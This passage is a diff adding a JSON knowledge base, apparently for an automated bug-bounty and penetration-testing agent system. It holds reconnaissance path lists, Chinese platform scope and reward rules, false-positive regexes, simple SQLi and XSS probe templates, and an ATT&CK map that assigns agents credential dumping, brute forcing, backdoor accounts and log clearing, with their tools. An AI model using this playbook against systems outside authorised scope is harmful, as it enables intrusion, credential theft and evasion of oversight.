@@ -1,0 +1,3058 @@
+{
+ "base_assets": [
+  {
+   "pattern_id": "ASSET-API-DOCS",
+   "category": "attack_surface",
+   "name": "未授权 API/文档常见路径",
+   "data": {
+    "paths": [
+     "/api/",
+     "/v1/",
+     "/swagger-ui.html",
+     "/v2/api-docs",
+     "/actuator"
+    ],
+    "用途": "Dirsearch/Gobuster 扫未授权接口文档"
+   },
+   "source": "设计书附录C-三 场景1（攻击面梳理步骤 4-5/场景10）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "pattern_id": "ASSET-SENSITIVE-FILES",
+   "category": "attack_surface",
+   "name": "敏感文件常见路径",
+   "data": {
+    "paths": [
+     "/robots.txt",
+     "/backup/",
+     "/config.php",
+     "/.git/",
+     "/db_backup.sql",
+     "/README.md"
+    ],
+    "用途": "敏感信息泄露面"
+   },
+   "source": "设计书附录C-三 场景1（攻击面梳理步骤 4-5/场景10）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "pattern_id": "ASSET-TEST-SUBDOMAINS",
+   "category": "attack_surface",
+   "name": "测试/预发环境子域前缀",
+   "data": {
+    "prefixes": [
+     "test.",
+     "uat.",
+     "pre.",
+     "dev."
+    ],
+    "用途": "常缺 WAF/弱口令/调试接口；注意可能被平台判测试环境无效"
+   },
+   "source": "设计书附录C-三 场景1（攻击面梳理步骤 4-5/场景10）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "pattern_id": "ASSET-INTERNAL-SYSTEMS",
+   "category": "attack_surface",
+   "name": "内部系统子域前缀",
+   "data": {
+    "prefixes": [
+     "oa.",
+     "admin.",
+     "crm.",
+     "jenkins.",
+     "gitlab.",
+     "wiki."
+    ],
+    "用途": "未授权访问或弱口令高发面"
+   },
+   "source": "设计书附录C-三 场景1（攻击面梳理步骤 4-5/场景10）",
+   "last_verified": "2026-10-09"
+  }
+ ],
+ "base_vuln_standards": [
+  {
+   "platform": "asrc",
+   "asset_tier": "",
+   "rule_type": "accept",
+   "include_condition": "【已查证】严重：海量资损刷钱、核心网络服务器权限、核心账号体系敏感信息多元组任意查询/修改、主账号任意登录、APP 远程无条件 RCE、云内提权到宿主机；云产品须为 aliyuncs.com 等阿里云域名",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://security.alibaba.com/announcement/announcement?id=219",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "asrc",
+   "asset_tier": "",
+   "rule_type": "exclude",
+   "include_condition": "",
+   "exclude_condition": "【已查证】无等级（0 贡献值）：功能缺陷/乱码/兼容性、Self-XSS、无敏感操作 CSRF、无意义异常信息泄露、内网 IP/域名泄露、管理后台泄露、默认 demo、仅小众浏览器触发的 XSS、邮件轰炸、轮询多手机短信轰炸、纯猜测；社会工程学（非盲打钓鱼）不在收集范围；仅理论可行无 PoC＝无效",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://security.alibaba.com/announcement/announcement?id=219",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "asrc",
+   "asset_tier": "",
+   "rule_type": "merge_dedup",
+   "include_condition": "【已查证】同一应用下同类型漏洞确认前 3 个；同一问题点导致只确认第 1 个；同一功能越权增删改查只确认 1 个；同库 SQL 注入确认前 3 个（第 1 个正常、后 2 个降一级）；0Day 最多前 3 个；同一组件多业务问题确认前 3 个；降级场景：需用户交互（除 CSRF/反射 XSS/JSONP 外）、利用有依赖/限制、影响量极小、部分环节重复；仅非 Chrome 触发的 XSS/JSONP 最高低危",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://security.alibaba.com/announcement/announcement?id=219",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": "测试机/测试数据漏洞＝无效（未运行实际业务）"
+  },
+  {
+   "platform": "asrc",
+   "asset_tier": "",
+   "rule_type": "reward",
+   "include_condition": "",
+   "exclude_condition": "",
+   "level_mapping": {
+    "严重": null,
+    "高": null,
+    "中": null,
+    "低": null,
+    "无": 0
+   },
+   "reward_range": "5 级×4 资产档：超级资产严重 10 万/高危 4 万；关键资产严重 3 万/高危 1.2 万/中危 1500/低危 500；核心资产严重 1 万；一般资产严重 6000",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://security.alibaba.com/announcement/announcement?id=211",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": "资产档：超级/关键/核心/一般"
+  },
+  {
+   "platform": "tsrc",
+   "asset_tier": "",
+   "rule_type": "accept",
+   "include_condition": "【已查证】技术维度（用户交互/攻击媒介/前置条件）+ 业务维度（功能重要度/影响数量/活跃度）综合定级；严重：核心产品远程可利用",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://security.tencent.com/uploadimg_dir/other/TSRC.pdf",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": "鼓励完整 PoC/可一键复现脚本"
+  },
+  {
+   "platform": "tsrc",
+   "asset_tier": "",
+   "rule_type": "exclude",
+   "include_condition": "",
+   "exclude_condition": "【已查证】重复、无法复现、无实际影响按重复/忽略处理",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://security.tencent.com/uploadimg_dir/other/TSRC.pdf",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "tsrc",
+   "asset_tier": "",
+   "rule_type": "reward",
+   "include_condition": "",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "贡献值＝积分×贡献系数（核心严重 9×220≈1980，1 贡献值=1 安全币=5 元）；严重额外现金：核心税后 3 万+，重点 1~3 万；高质量报告奖最高 5000；通用软件严重最高 100 万",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://security.tencent.com/index.php/blog/msg/200",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": "资产系数：核心/重点/边缘产品"
+  },
+  {
+   "platform": "bytesrc",
+   "asset_tier": "",
+   "rule_type": "accept",
+   "include_condition": "【已查证】V6.0 增设「重大漏洞」：抖音高系数资产中无交互接管任意账号/无交互获取任意用户手机号或身份证且无风控拦截＝20 万/个；其他重大 10 万",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://q2a1fk6o03.feishu.cn/docx/WPOHdeVdLoJgPfx25VmcfVJxnde",
+   "verified_at": "2026-10-09",
+   "effective_date": "V6.0",
+   "note": ""
+  },
+  {
+   "platform": "bytesrc",
+   "asset_tier": "",
+   "rule_type": "exclude",
+   "include_condition": "",
+   "exclude_condition": "【已查证】AI 直接生成、未经人工复现的报告＝无效；同一漏洞源合并；超出「暂不收取业务范围」清单＝不收",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://lf-bytesecurity.bytecdn.com/obj/bytesecurity/bytesrc/字节跳动安全响应中心基本原则与测试规范.pdf",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": "暂不收取范围清单不定期更新：https://src.bytedance.com/announcement"
+  },
+  {
+   "platform": "bytesrc",
+   "asset_tier": "",
+   "rule_type": "redline",
+   "include_condition": "",
+   "exclude_condition": "【已查证】禁止引起业务异常；禁止扫描器/自动化工具，只允许手工测试；禁止任何 DoS/DDoS 及自动扫描产生大流量；禁止内网渗透延伸行为；注入严禁读表数据，UPDATE/DELETE/INSERT 类注入禁自动化；禁止近源攻击/物理入侵/社工/邮件钓鱼；禁止使用社工库",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": false,
+   "report_required": {},
+   "source_url": "https://lf-bytesecurity.bytecdn.com/obj/bytesecurity/bytesrc/字节跳动安全响应中心基本原则与测试规范.pdf",
+   "verified_at": "2026-10-09",
+   "effective_date": "V4.0/V6.0",
+   "note": ""
+  },
+  {
+   "platform": "bytesrc",
+   "asset_tier": "",
+   "rule_type": "approval",
+   "include_condition": "【已查证】敏感测试（反弹 shell、容器逃逸、文件上传）须提前在线报备，未报备不计奖励",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {
+    "敏感测试": [
+     "reverse_shell",
+     "container_escape",
+     "webshell_upload"
+    ],
+    "需提前报备": true
+   },
+   "source_url": "https://lf-bytesecurity.bytecdn.com/obj/bytesecurity/bytesrc/字节跳动安全响应中心基本原则与测试规范.pdf",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "bytesrc",
+   "asset_tier": "",
+   "rule_type": "reward",
+   "include_condition": "",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "重大/严重/高/中/低 × 高/中/低系数资产；单洞累计可达 20 万；成长体系额外 +1200~9000 元",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://security.bytedance.com/news/douyin-vulnerability-bounty-increased-to-200000-yuan-per-vulnerability/",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "butian",
+   "asset_tier": "",
+   "rule_type": "accept",
+   "include_condition": "【已查证】通用 2.0：未授权下可直接或组合达 RCE（远程命令执行/文件上传等）；VPN 收录二次认证绕过/账号枚举；虚拟化收录虚拟机逃逸；分通用型+事件型",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.butian.net/Article/content/id/667",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "butian",
+   "asset_tier": "",
+   "rule_type": "exclude",
+   "include_condition": "",
+   "exclude_condition": "【已查证】无法复现、危害小、抄袭/未验证、厂商太小（权重<1）或已停维、与平台记录重复或细节已公开",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.butian.net/newneed",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "butian",
+   "asset_tier": "",
+   "rule_type": "redline",
+   "include_condition": "",
+   "exclude_condition": "【已查证】禁止对生产环境文件覆盖/删除等高并发操作；测试致系统异常须立即联系平台",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.butian.net/newneed",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "butian",
+   "asset_tier": "",
+   "rule_type": "merge_dedup",
+   "include_condition": "【已查证】同源同类型漏洞只收一例",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.butian.net/newneed",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "butian",
+   "asset_tier": "",
+   "rule_type": "reward",
+   "include_condition": "",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "公益 SRC：KB 库币（1KB≈5 元兑实物）+ 现金；专属 SRC 现金按厂商计划；事件漏洞高危大型厂商 ¥100~2000；低危≤1KB 无积分；周三打款",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.butian.net/Reward/pub",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "vulbox",
+   "asset_tier": "",
+   "rule_type": "accept",
+   "include_condition": "【已查证】SQL 注入须注出≥1 条数据证明危害；弱口令按系统重要度定级（重要系统管理员弱口令=高危）；越权/未授权",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.vulbox.com/faq?id=79",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "vulbox",
+   "asset_tier": "",
+   "rule_type": "exclude",
+   "include_condition": "",
+   "exclude_condition": "【已查证】严禁拖库；单纯报错无危害证明＝忽略；已获 webshell 禁止下载源码审计（须先报平台征得厂商同意）；GitHub/网盘泄露类须上报厂商确认归属，常归潜在风险不奖励",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.vulbox.com/faq?id=79",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "vulbox",
+   "asset_tier": "",
+   "rule_type": "merge_dedup",
+   "include_condition": "【已查证】同一漏洞源产生的多个漏洞计 1 个（同接口多漏洞/同发布系统多页面/框架整站/泛解析多站/未身份校验多接口越权/未 token 校验多 CSRF/同上传组件/验证码失效多问题/报错多页敏感信息）；前后关联漏洞合并；同系统多用户弱口令只确认第 1 个；同系统短时≥3 个同类型高危＝合并/降级后续忽略；严重敏感身份信息＝至少 3 个敏感字段（姓名/身份证、银行卡、手机/邮箱、密码、地址）",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.vulbox.com/faq?id=79",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": "边缘/废弃业务系统酌情降级；CVSS 高利用难度降级"
+  },
+  {
+   "platform": "vulbox",
+   "asset_tier": "",
+   "rule_type": "reward",
+   "include_condition": "",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "严重/高/中/低：严重 ¥200~4000（按项目）；低危（反射 XSS/普通 CSRF/URL 跳转/phpinfo）¥50~200",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.vulbox.com/news/detail-225",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "cnvd",
+   "asset_tier": "",
+   "rule_type": "accept",
+   "include_condition": "【已查证】原创漏洞；通用型（CVSS2.0 基准>4.0，可多实例验证）可获收录证书；事件型覆盖电信运营商/中央部委等；须可验证（PoC/多实例/验证过程+截图）",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.cnvd.org.cn/webinfo/list?type=16",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "cnvd",
+   "asset_tier": "",
+   "rule_type": "exclude",
+   "include_condition": "",
+   "exclude_condition": "【已查证】小厂商产品、黑盒案例不足 10 起等不颁证书",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.cnvd.org.cn/webinfo/list?type=16",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "cnvd",
+   "asset_tier": "",
+   "rule_type": "reward",
+   "include_condition": "",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "积分＝CVSS2.0 基本向量评分 × 目标对象权重系数；三级审核（完整性→整理→有效性+原创性查重）；bonus.cnvd.org.cn 积分兑换",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://zc.cnvd.org.cn/news/info?id=169&newsTypeCode=100100",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "cnnvd",
+   "asset_tier": "",
+   "rule_type": "accept",
+   "include_condition": "【已查证】依据 GB/T 30279：技术分级（被利用性×影响程度）→ 综合分级（叠加环境因素）；技术分级为高 ≠ 综合评级为高",
+   "exclude_condition": "",
+   "level_mapping": {},
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.cnnvd.org.cn/frontend/aboutUs",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": ""
+  },
+  {
+   "platform": "cnnvd",
+   "asset_tier": "",
+   "rule_type": "level_mapping",
+   "include_condition": "",
+   "exclude_condition": "",
+   "level_mapping": {
+    "超危": null,
+    "高": null,
+    "中": null,
+    "低": null
+   },
+   "reward_range": "",
+   "auto_test_allowed": null,
+   "report_required": {},
+   "source_url": "https://www.cnnvd.org.cn/frontend/aboutUs",
+   "verified_at": "2026-10-09",
+   "effective_date": "",
+   "note": "非赏金制，供政府/行业/厂商共享通报；数据 XML 格式对外下载"
+  }
+ ],
+ "base_fp_signatures": [
+  {
+   "fp_id": "fp-encoded-reflect",
+   "vuln_type": "xss",
+   "desc": "反射内容经 HTML 实体编码，浏览器不可执行",
+   "check_kind": "code",
+   "check_ref": "xss_encoded",
+   "action": "reject",
+   "source": "内置误报特征（核验参考）",
+   "last_verified": "2026-10-10"
+  },
+  {
+   "fp_id": "fp-static-error-page",
+   "vuln_type": "sqli",
+   "desc": "报错特征来自静态自定义错误页（基线响应即含同样特征，且无布尔差异）",
+   "check_kind": "code",
+   "check_ref": "error_in_baseline",
+   "action": "reject",
+   "source": "内置误报特征（核验参考）",
+   "last_verified": "2026-10-10"
+  },
+  {
+   "fp_id": "fp-canary-no-reflect",
+   "vuln_type": "ssrf",
+   "desc": "canary 出现在响应中但为原样回显参数而非实际请求结果",
+   "check_kind": "code",
+   "check_ref": "ssrf_echo_only",
+   "action": "reject",
+   "source": "内置误报特征（核验参考）",
+   "last_verified": "2026-10-10"
+  },
+  {
+   "fp_id": "fp-self-xss",
+   "vuln_type": "xss",
+   "desc": "Self-XSS（仅自己输入自己看到）：无受害者，各平台明确不收",
+   "check_kind": "pattern",
+   "check_ref": "(?i)self[-_ ]?xss",
+   "action": "reject",
+   "source": "设计书附录C-2.2（ASRC 无等级清单）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "fp_id": "fp-test-env",
+   "vuln_type": "*",
+   "desc": "测试环境/测试数据漏洞（未运行实际业务的机器）：ASRC 判无效",
+   "check_kind": "pattern",
+   "check_ref": "(?i)\\b(test|uat|pre|dev|staging)\\d*\\.",
+   "action": "downgrade",
+   "source": "设计书附录C-2.2（ASRC§七 影响测试数据=无效）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "fp_id": "fp-non-chrome-only",
+   "vuln_type": "xss",
+   "desc": "仅非 Chrome 触发的 XSS/JSONP：利用面极窄，ASRC 最高低危",
+   "check_kind": "pattern",
+   "check_ref": "(?i)(firefox|safari|\\bie\\b|edge)\\s*(only|仅)",
+   "action": "downgrade",
+   "source": "设计书附录C-2.2（ASRC§七第 8 条）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "fp_id": "fp-mail-bombing",
+   "vuln_type": "*",
+   "desc": "邮件轰炸/轮询多手机短信轰炸：骚扰类、非安全漏洞",
+   "check_kind": "pattern",
+   "check_ref": "(?i)(邮件|短信)轰炸|mail[- ]?bomb",
+   "action": "reject",
+   "source": "设计书附录C-2.2（ASRC 无等级清单）",
+   "last_verified": "2026-10-09"
+  }
+ ],
+ "base_poc_templates": [
+  {
+   "template_id": "POC-SQLI-001",
+   "vuln_type": "sqli",
+   "name": "SQL 注入报错回显 PoC",
+   "request_spec": {
+    "method": "GET",
+    "params_from": "payload_or_default",
+    "default_payload": "'",
+    "expect": "sql_error"
+   },
+   "verify_method": "响应含 SQL 报错特征（mysql_/ORA-/SQLSTATE 等）",
+   "source": "内置 PoC 模板（verify/poc_templates.py）同源镜像",
+   "last_verified": "2026-10-10"
+  },
+  {
+   "template_id": "POC-XSS-001",
+   "vuln_type": "xss",
+   "name": "反射型 XSS 原始反射 PoC",
+   "request_spec": {
+    "method": "GET",
+    "params_from": "evidence.payload",
+    "expect": "raw_reflection",
+    "canary": "spirxss"
+   },
+   "verify_method": "响应包含未编码的 canary+标签反射",
+   "source": "内置 PoC 模板（verify/poc_templates.py）同源镜像",
+   "last_verified": "2026-10-10"
+  },
+  {
+   "template_id": "POC-SSRF-001",
+   "vuln_type": "ssrf",
+   "name": "SSRF canary 带外证明 PoC",
+   "request_spec": {
+    "method": "GET",
+    "params_from": "evidence.canary_url",
+    "expect": "substring",
+    "substring": "SPIR-SSRF-CANARY"
+   },
+   "verify_method": "响应含 canary 服务返回特征（证明服务端实际发起请求）",
+   "source": "内置 PoC 模板（verify/poc_templates.py）同源镜像",
+   "last_verified": "2026-10-10"
+  },
+  {
+   "template_id": "POC-INFO-001",
+   "vuln_type": "info_disclosure",
+   "name": "敏感信息泄露复访 PoC",
+   "request_spec": {
+    "method": "GET",
+    "params_from": "none",
+    "marker_from": "evidence.marker",
+    "expect": "substring_or_status_200"
+   },
+   "verify_method": "复访返回敏感标记或 200（证明泄露可稳定复现）",
+   "source": "内置 PoC 模板（verify/poc_templates.py）同源镜像",
+   "last_verified": "2026-10-10"
+  }
+ ],
+ "base_competition_rules": [
+  {
+   "rule_id": "CONTEST-JEOPARDY-BASE",
+   "contest_type": "jeopardy",
+   "name": "Jeopardy 解题赛基线",
+   "rules": {
+    "调度": "6.7 优先级公式：分值×成功率预估×时间衰减÷资源消耗",
+    "提交": "按赛方 rate_limit_per_minute 限频，格式校验+去重",
+    "资源": "max_parallel 并发题数，解出即转移资源"
+   },
+   "source": "设计书 4.5/5.3（赛制自适应）",
+   "last_verified": "2026-10-10"
+  },
+  {
+   "rule_id": "CONTEST-AWD-BASE",
+   "contest_type": "awd",
+   "name": "AWD 攻防赛基线",
+   "rules": {
+    "边界": "仅在赛方授权 CIDR 内攻击；禁对平台基础设施发起 DoS",
+    "调度": "awd_rebalance 按得分/失分动态调整攻防配比",
+    "提交": "按轮次提交 Flag，频率限制从赛方规则解析"
+   },
+   "source": "设计书 4.5/5.3（赛制自适应）",
+   "last_verified": "2026-10-10"
+  },
+  {
+   "rule_id": "CONTEST-RANGE-BASE",
+   "contest_type": "range",
+   "name": "靶场渗透赛基线",
+   "rules": {
+    "链路": "SRC 链路：侦察→探测→全链路核验→渗透报告",
+    "交付": "渗透报告（非 WriteUp）",
+    "边界": "按赛方划定靶标范围，Flag 与漏洞双产出"
+   },
+   "source": "设计书 4.5/5.3（赛制自适应）",
+   "last_verified": "2026-10-10"
+  }
+ ],
+ "exp_attack_map": [
+  {
+   "id": 1,
+   "tactic_id": "TA0043",
+   "tactic_name": "Reconnaissance",
+   "technique_id": "T1595",
+   "technique_name": "Active Scanning",
+   "sub_techniques": "-",
+   "operation": "主动扫描目标网段/端口",
+   "tools": "nmap, masscan, amass",
+   "agent_type": "侦察 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 2,
+   "tactic_id": "TA0043",
+   "tactic_name": "Reconnaissance",
+   "technique_id": "T1594",
+   "technique_name": "Search Open Website/Domains",
+   "sub_techniques": "-",
+   "operation": "搜索引擎/Dork 收集子域、邮箱、员工",
+   "tools": "Google dorks, theHarvester",
+   "agent_type": "侦察 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 3,
+   "tactic_id": "TA0001",
+   "tactic_name": "Initial Access",
+   "technique_id": "T1190",
+   "technique_name": "Exploit Public-Facing Application",
+   "sub_techniques": "-",
+   "operation": "利用公网 Web 漏洞 RCE",
+   "tools": "nuclei, Burp, exp 脚本",
+   "agent_type": "Web 漏洞 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 4,
+   "tactic_id": "TA0001",
+   "tactic_name": "Initial Access",
+   "technique_id": "T1133",
+   "technique_name": "External Remote Services",
+   "sub_techniques": "-",
+   "operation": "利用 VPN/Citrix/暴露的 RDP 弱口令",
+   "tools": "hydra, xrdp",
+   "agent_type": "侦察/Web Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 5,
+   "tactic_id": "TA0001",
+   "tactic_name": "Initial Access",
+   "technique_id": "T1566",
+   "technique_name": "Phishing",
+   "sub_techniques": ".001/.002/.003",
+   "operation": "钓鱼附件/链接/经第三方",
+   "tools": "gophish, 宏, LNK",
+   "agent_type": "钓鱼 Agent（授权内）",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 6,
+   "tactic_id": "TA0001",
+   "tactic_name": "Initial Access",
+   "technique_id": "T1078",
+   "technique_name": "Valid Accounts",
+   "sub_techniques": ".001-.004",
+   "operation": "使用泄露/默认/域/云账户登录",
+   "tools": "任意合法服务",
+   "agent_type": "侦察/后渗透",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 7,
+   "tactic_id": "TA0002",
+   "tactic_name": "Execution",
+   "technique_id": "T1059",
+   "technique_name": "Command and Scripting Interpreter",
+   "sub_techniques": ".001 PowerShell/.003 Unix Shell/.005 Visual Basic",
+   "operation": "命令行/脚本解释器执行",
+   "tools": "powershell, bash, cscript",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 8,
+   "tactic_id": "TA0002",
+   "tactic_name": "Execution",
+   "technique_id": "T1204",
+   "technique_name": "User Execution",
+   "sub_techniques": ".002 Malicious File",
+   "operation": "诱导用户执行恶意文件",
+   "tools": "钓鱼落地",
+   "agent_type": "钓鱼 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 9,
+   "tactic_id": "TA0003",
+   "tactic_name": "Persistence",
+   "technique_id": "T1136",
+   "technique_name": "Create Account",
+   "sub_techniques": ".001 Local/.002 Domain",
+   "operation": "创建后门账户",
+   "tools": "net user, Add-ADUser",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 10,
+   "tactic_id": "TA0003",
+   "tactic_name": "Persistence",
+   "technique_id": "T1053",
+   "technique_name": "Scheduled Task/Job",
+   "sub_techniques": ".001 Windows/.003 Cron",
+   "operation": "计划任务/cron 持久化",
+   "tools": "schtasks, crontab",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 11,
+   "tactic_id": "TA0004",
+   "tactic_name": "Privilege Escalation",
+   "technique_id": "T1548",
+   "technique_name": "Abuse Elevation Control Mechanism",
+   "sub_techniques": ".002 Bypass UAC/.003 Sudo and Sudo Caching",
+   "operation": "滥用提权控制机制（UAC/sudo）",
+   "tools": "Potato 系列, sudo",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 12,
+   "tactic_id": "TA0004",
+   "tactic_name": "Privilege Escalation",
+   "technique_id": "T1078",
+   "technique_name": "Valid Accounts",
+   "sub_techniques": "-",
+   "operation": "用高权限账户直接提权",
+   "tools": "-",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 13,
+   "tactic_id": "TA0005",
+   "tactic_name": "Stealth",
+   "technique_id": "T1218",
+   "technique_name": "System Binary Proxy Execution",
+   "sub_techniques": ".001 Compiled HTML/.005 Mshta/.013 MMC",
+   "operation": "用白名单二进制代理执行（LOLBins）",
+   "tools": "mshta, regsvr32, rundll32",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 14,
+   "tactic_id": "TA0005",
+   "tactic_name": "Stealth",
+   "technique_id": "T1070",
+   "technique_name": "Indicator Removal",
+   "sub_techniques": ".002 Clear Event Logs/.006 Timestomp",
+   "operation": "清日志/改时间戳",
+   "tools": "wevtutil, timestomp",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 15,
+   "tactic_id": "TA0006",
+   "tactic_name": "Credential Access",
+   "technique_id": "T1003",
+   "technique_name": "OS Credential Dumping",
+   "sub_techniques": ".001 LSASS/.002 SAM/.003 NTDS/.004 LSA Secrets/.006 DCSync/.008 /etc/passwd|shadow",
+   "operation": "转储 OS 凭据",
+   "tools": "mimikatz, secretsdump, laZagne",
+   "agent_type": "后渗透 Agent",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 16,
+   "tactic_id": "TA0006",
+   "tactic_name": "Credential Access",
+   "technique_id": "T1110",
+   "technique_name": "Brute Force",
+   "sub_techniques": ".001 Guessing/.002 Cracking/.003 Spraying/.004 Stuffing",
+   "operation": "在线猜解/离线破解/喷洒/撞库",
+   "tools": "hydra, hashcat, kerbrute",
+   "agent_type": "侦察/后渗透",
+   "source": "设计书附录B-三（attack.mitre.org 官方页实际访问 2026-10-09）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "id": 17,
+   "tactic_id": "TA0006",
+   "tactic_name": "Credential Access",
+   "technique_id": "T1557",
